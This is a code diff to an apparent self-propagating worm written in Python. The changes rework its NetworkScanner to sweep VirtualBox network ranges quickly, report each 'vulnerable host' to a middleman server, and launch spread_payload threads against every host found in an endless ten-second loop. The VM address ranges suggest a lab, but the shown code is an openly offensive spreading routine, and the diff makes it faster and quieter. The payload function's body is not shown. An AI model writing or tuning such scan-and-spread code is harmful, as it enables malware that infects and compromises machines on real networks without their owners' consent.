@@ -251,6 +251,11 @@ class NetworkScanner:
         self.target_ports = [5000, 5001, 5002]
         self.middleman_host = middleman_host
         self.middleman_port = middleman_port
+        # Focus on most likely VM network ranges
+        self.network_ranges = [
+            "10.0.2",     # VirtualBox default NAT
+            "192.168.56", # VirtualBox default Host-only
+        ]
         print(f"Scanner initialized with middleman: {middleman_host}:{middleman_port}")
 
     def notify_middleman(self, new_host):
@@ -279,67 +284,52 @@ class NetworkScanner:
             print(f"Error scanning {host}:{port} - {e}")
             return False
 
-    def get_local_ip_range(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            local_ip = s.getsockname()[0]
-            s.close()
+    def scan_networks(self):
+        """Scan multiple network ranges."""
+        active_threads = []
+        max_threads = 20  # Limit concurrent threads
+        
+        for base_ip in self.network_ranges:
+            print(f"Scanning network range: {base_ip}.0/24")
+            for i in range(1, 255):
+                host = f"{base_ip}.{i}"
+                
+                # Clean up completed threads
+                active_threads = [t for t in active_threads if t.is_alive()]
+                
+                # Wait if too many threads
+                while len(active_threads) >= max_threads:
+                    time.sleep(0.1)
+                    active_threads = [t for t in active_threads if t.is_alive()]
+                
+                thread = threading.Thread(target=self.scan_host, args=(host,))
+                thread.daemon = True
+                thread.start()
+                active_threads.append(thread)
             
-            ip_parts = local_ip.split('.')
-            base_ip = '.'.join(ip_parts[:3])
-            print(f"Local IP: {local_ip}")
-            print(f"Scanning network: {base_ip}.0/24")
-            return base_ip
-        except Exception as e:
-            print(f"Error getting local IP range: {e}")
-            return "192.168.1"
+            # Wait for all threads in this range to complete
+            for t in active_threads:
+                t.join()
 
     def scan_host(self, host):
-        print(f"Scanning host: {host}")
         try:
-            # First check if host is alive using ping
-            if os.name == 'nt':  # Windows
-                ping_cmd = f"ping -n 1 -w 500 {host}"
-            else:  # Linux/Mac
-                ping_cmd = f"ping -c 1 -W 1 {host}"
+            # Quick check for first port
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.2)  # Very short timeout
+            result = sock.connect_ex((host, self.target_ports[0]))
+            sock.close()
             
-            ping_result = subprocess.call(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            if ping_result == 0:
-                print(f"Host {host} is alive, checking ports")
-                for port in self.target_ports:
+            if result == 0:
+                print(f"Found potential host: {host}")
+                # Check other ports
+                for port in self.target_ports[1:]:
                     if self.scan_port(host, port):
                         print(f"Found vulnerable host: {host} with port {port} open")
                         self.vulnerable_hosts.put((host, port))
                         self.notify_middleman(host)
                         break
-            else:
-                print(f"Host {host} is not responding to ping")
-        except Exception as e:
-            print(f"Error scanning {host}: {e}")
-
-    def scan_network(self):
-        """Scan the entire network for vulnerable hosts."""
-        base_ip = self.get_local_ip_range()
-        scan_threads = []
-        
-        for i in range(1, 255):
-            host = f"{base_ip}.{i}"
-            thread = threading.Thread(target=self.scan_host, args=(host,))
-            thread.daemon = True
-            scan_threads.append(thread)
-            thread.start()
-            
-            # Limit concurrent threads
-            if len(scan_threads) >= 10:
-                for t in scan_threads:
-                    t.join()
-                scan_threads = []
-        
-        # Wait for remaining threads
-        for t in scan_threads:
-            t.join()
+        except:
+            pass
 
     def get_vulnerable_hosts(self):
         """Return list of vulnerable hosts found."""
@@ -373,32 +363,26 @@ def spread_payload(target_host, target_port):
         print(f"Failed to spread to {target_host}:{target_port}: {e}")
 
 def start_spreading():
-    """Start scanning and spreading to vulnerable hosts."""
     print("Starting network scanner...")
-    scanner = NetworkScanner(middleman_host="192.168.1.13", middleman_port=8080)
+    scanner = NetworkScanner(middleman_host="10.0.2.15", middleman_port=8080)
     
     while True:
         try:
-            print("\nStarting new network scan...")
-            scanner.scan_network()
-            
+            scanner.scan_networks()
             vulnerable_hosts = scanner.get_vulnerable_hosts()
-            print(f"Found {len(vulnerable_hosts)} vulnerable hosts")
             
             for host, port in vulnerable_hosts:
-                print(f"Attempting to spread to {host}:{port}")
                 threading.Thread(
                     target=spread_payload,
                     args=(host, port),
                     daemon=True
                 ).start()
             
-            print("Waiting before next scan...")
-            time.sleep(60)  # Scan every minute instead of 5 minutes
+            time.sleep(10)  # Shorter delay between scans
             
         except Exception as e:
             print(f"Error in spreading routine: {e}")
-            time.sleep(30)
+            time.sleep(5)
 
 
 if __name__ == "__main__":
